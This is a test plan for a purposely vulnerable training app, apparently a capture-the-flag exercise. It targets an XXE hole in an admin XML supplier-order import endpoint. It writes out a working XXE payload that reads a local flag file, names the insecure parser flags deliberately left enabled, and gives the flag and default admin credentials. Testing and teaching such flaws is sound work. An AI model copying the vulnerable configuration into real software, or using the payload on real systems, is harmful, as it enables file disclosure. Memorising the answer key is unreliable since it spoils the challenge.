# Test Plan: XXE Supplier Order Import

**Slug:** `xxe-supplier-order-import`
**Flag:** `OSS{xml_3xt3rn4l_3nt1ty_1nj3ct10n}`
**Category:** INJECTION
**Difficulty:** HARD

## Vulnerability Summary

The `POST /api/admin/suppliers/import-order` endpoint parses XML using `libxmljs2` with `{ noent: true, dtdload: true }`, enabling XML External Entity (XXE) attacks. An attacker can define external entities to read local files like `flag-xxe.txt`.

## Source Files

- `app/api/admin/suppliers/import-order/route.ts`
- `flag-xxe.txt` (contains the flag: `OSS{xml_3xt3rn4l_3nt1ty_1nj3ct10n}`)

## Test Type

**Jest API test** — `tests/api/xxe-supplier-order-import.test.ts`

## Prerequisites

- A seeded database with admin user.
- Admin authentication required (`admin@oss.com` / `admin`).
- The file `flag-xxe.txt` must exist at the project root.

## Test Scenarios

### 1. XXE attack reads local file and returns flag content

**Steps:**

1. Login as admin (`admin@oss.com` / `admin`).
2. Send `POST /api/admin/suppliers/import-order` with:
   - Header: `Content-Type: application/xml` (or `text/xml`)
   - Cookie: admin auth token
   - Body:
     ```xml
     <?xml version="1.0" encoding="UTF-8"?>
     <!DOCTYPE order [
       <!ENTITY xxe SYSTEM "file:///PATH_TO_PROJECT/flag-xxe.txt">
     ]>
     <order>
       <supplierId>&xxe;</supplierId>
       <orderId>XXE-TEST-001</orderId>
       <total>100</total>
       <notes>XXE test</notes>
     </order>
     ```
   - Replace `PATH_TO_PROJECT` with the actual project root path (use `process.cwd()` in the test).
3. Assert response status is `200`.
4. Assert the `order.supplierId` in the response body contains content from `flag-xxe.txt` (which includes `OSS{xml_3xt3rn4l_3nt1ty_1nj3ct10n}`).

### 2. Invalid XML structure returns debug config path

**Steps:**

1. Login as admin.
2. Send `POST /api/admin/suppliers/import-order` with body:
   ```xml
   <?xml version="1.0"?><invalid><data>test</data></invalid>
   ```
3. Assert response status is `400`.
4. Assert response body contains `debug.config` with a file path (leaks `SUPPLIER_REGISTRY_PATH`).

### 3. Empty body is rejected

**Steps:**

1. Login as admin.
2. Send `POST /api/admin/suppliers/import-order` with empty body.
3. Assert response status is `400`.
4. Assert error mentions "Empty request body".

### 4. Non-admin is rejected

**Steps:**

1. Login as `alice@example.com`.
2. Send `POST /api/admin/suppliers/import-order` with valid XML.
3. Assert response status is `403`.

### 5. Valid XML without XXE works normally

**Steps:**

1. Login as admin.
2. Send valid XML:
   ```xml
   <?xml version="1.0"?><order><supplierId>SUP-001</supplierId><orderId>ORD-TEST</orderId><total>50.00</total><notes>Normal order</notes></order>
   ```
3. Assert response status is `200`.
4. Assert response body contains `order` with matching fields.

## Implementation Notes

- The endpoint uses `libxmljs2` with `{ noent: true, dtdload: true }` — both flags are critical for XXE.
- `noent: true` enables entity expansion (replaces `&xxe;` with file content).
- `dtdload: true` allows loading external DTD definitions.
- The `SUPPLIER_REGISTRY_PATH` constant leaks in error responses as `debug.config`.
- The request must be sent with the raw XML string as the body (NOT JSON).
- Use `fetch` with `Content-Type: text/xml` or `application/xml`.
